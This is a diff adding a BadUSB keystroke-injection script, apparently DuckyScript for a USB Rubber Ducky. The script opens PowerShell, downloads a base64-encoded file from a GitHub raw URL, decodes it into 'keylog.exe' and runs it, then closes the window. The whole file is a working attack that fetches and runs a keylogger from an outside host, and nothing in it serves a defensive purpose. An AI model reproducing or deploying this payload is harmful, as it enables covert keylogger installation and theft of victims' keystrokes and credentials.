@@ -1,0 +1,27 @@
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+
+REM Download encoded executable
+STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/encoded-20240308210244.txt'; $out='encoded-20240308210244.txt'; Invoke-WebRequest -Uri $url -OutFile $out
+ENTER
+DELAY 1000
+
+REM Decode the file and save as .exe
+STRING $data=Get-Content -Path encoded-20240308210244.txt; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('keylog.exe', $decoded)
+ENTER
+DELAY 1000
+
+REM Execute the decoded .exe file
+STRING Start-Process -FilePath .\keylog.exe
+ENTER
+DELAY 500
+
+REM Close PowerShell
+STRING exit
+ENTER
+
